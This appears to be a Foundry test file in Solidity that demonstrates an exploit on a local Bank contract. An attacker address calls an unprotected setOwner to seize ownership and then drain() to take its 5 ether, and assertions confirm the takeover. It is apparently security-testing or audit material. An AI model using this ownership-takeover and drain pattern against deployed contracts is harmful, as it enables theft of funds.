// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/uploads/Bank.sol";

contract BankExploitTest is Test {
    Bank public bank;
    address deployer = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        vm.deal(deployer, 10 ether);
        vm.startPrank(deployer);
        bank = new Bank{value: 5 ether}();
        vm.stopPrank();
    }

    function test_UnauthorizedDrain() public {
        // Pre-exploit checks
        assertEq(bank.owner(), deployer, "Original owner should be deployer");
        assertEq(address(bank).balance, 5 ether, "Initial balance incorrect");

        // Attack sequence
        vm.startPrank(attacker);
        bank.setOwner(attacker);  // Unauthorized ownership change
        bank.drain();              // Drain funds
        vm.stopPrank();

        // Post-exploit assertions
        assertEq(bank.owner(), attacker, "Ownership takeover failed");
        assertEq(address(bank).balance, 0, "Funds not drained");
        assertEq(attacker.balance, 5 ether, "Attacker didn't receive funds");
    }
}
